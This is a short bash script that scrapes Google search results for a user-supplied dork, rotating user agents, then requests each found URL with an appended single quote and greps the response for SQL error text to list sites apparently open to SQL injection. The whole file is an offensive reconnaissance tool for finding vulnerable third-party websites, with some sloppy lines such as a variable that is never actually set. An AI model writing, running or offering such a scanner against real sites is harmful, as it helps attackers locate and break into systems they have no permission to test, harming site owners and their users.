echo "Enter dork"
read dorked
#browser='Mozilla/5.0_(MSIE;_Windows_10)'
files="./temp"
nothing(){
oh=33
}

sort -R userA | head -n 1 > browser
browsers= cat browser
echo $dorked | while read in
do curl -sS -A $browser --url "https://www.google.com/search?q=inurl:$dorked" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > tested
done
#cat $dorked | while read dur; do curl -sS -A $browser "https://www.google.com/search?q=inurl:$dur" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"; done < tested
#curl -sS -A $browser "https://www.google.com/search?q=inurl:$dorked" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > tested
sudo sed -i "s|%3F|?|g" ./tested
sudo sed -i "s|%3D|=|g" ./tested
cat tested | while read in
do curl "$in'" | grep SQL
if [ $? -eq 0 ]; then
    echo $in
    echo
else 
    nothing
fi
done > $files
cat tested | while read in
do curl "$in'" | grep sql
if [ $? -eq 0 ]; then
    echo $in
    echo
else 
    nothing
fi
done >> $files
echo "Here are your results:"
echo
cat $files
rm -rf $files
rm -rf ./tested
